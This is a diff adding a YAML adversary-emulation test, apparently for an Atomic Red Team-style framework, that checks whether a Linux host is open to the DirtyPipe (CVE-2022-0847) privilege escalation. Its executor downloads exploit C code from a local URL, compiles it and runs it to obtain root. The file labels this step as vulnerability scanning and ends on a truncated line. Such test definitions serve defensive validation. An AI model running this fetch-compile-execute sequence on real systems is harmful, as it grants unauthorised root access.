@@ -1,0 +1,66 @@
+attack_technique: T1595.002
+display_name: 'Active Scanning: Vulnerability Scanning'
+category:
+    - Reconnaissance
+progress: Complete
+atomic_tests:
+    - name:  'Active Scanning: Vulnerability Scanning'
+      description: |
+        English : local privilege escalation using DirtyPipe(CVE-2022-0847)
+
+        Korean :
+        DirtyPipe(CVE-2022-0847)을 사용하여 Exploit LPE가 가능한지 스캔
+
+         - Execute : DirtyPipe 취약점이 사용될 수 있는지 확인
+         - Pre : 필요 없음
+         - Input : dirtypipe C 코드 url
+         - dependencies: git, gcc
+         - Output : root 권한 폴더
+         - Post : root 권한 폴더 확인
+
+      supported_platforms:
+        - linux
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments:
+        dirtypipeurl:
+            description: dirtypipe file url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1068/T1068@1.c'
+      dependency_executor_name: bash
+      dependencies: 
+        - description: |
+            git, gcc must be installed on the machine.
+          prereq_command: |
+            if [ -x "$(command -v git)" ]; then echo 0; else exit 1; fi
+            if [ -x "$(command -v gcc)" ]; then echo 0; else exit 1; fi
+          get_prereq_command: |
+            (which yum && yum -y install gcc) || (which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gcc)
+            (which yum && yum -y install git) || (which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y git)
+      executor:
+        name: bash
+        command: |
+            mkdir /tmp/T1068 > /dev/null 2>&1
+            wget #{dirtypipeurl} -O /tmp/T1068/T1068@1.c
+            gcc /tmp/T1068/T1068@1.c -o /tmp/T1068/LPE_Exploit
+            /tmp/T1068/LPE_Exploit
+            ls /tmp/T1068_DirtyPipe -al
+            exit 0
+      output:
+        output_executor_name: bash
+        command: |
+            ls /tmp/T1068_DirtyPipe -al
+      post:
+        post_executor_name: bash
+        command: |
+            ls /tmp/T1068_DirtyPipe -al | grep "root" && exit 0 || exit 1
+      technique_remote: False
+      dest:
+        pre_state:
+          - Compromised : True
+          - OS_type : linux
+          - OS_status : Running
+          - Privilege : Not Admin
+        post_state:
+          - OS_v : CVE-1
